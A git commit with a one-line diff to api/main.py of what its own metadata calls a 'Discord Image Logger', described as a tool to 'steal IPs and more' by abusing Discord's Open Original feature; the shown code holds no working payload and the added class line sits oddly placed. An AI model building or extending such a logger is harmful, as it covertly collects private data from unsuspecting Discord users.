2a9975dcb489f7f3482c2e1819d118a2c90f11bd
mahaffykai-prog <mahaffykai@gmail.com>
2026-08-13 18:29:42 +0800

    Update main.py

--- api/main.py
+++ api/main.py
@@ -4,7 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-
+class handler(BaseHTTPRequestHandler):
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
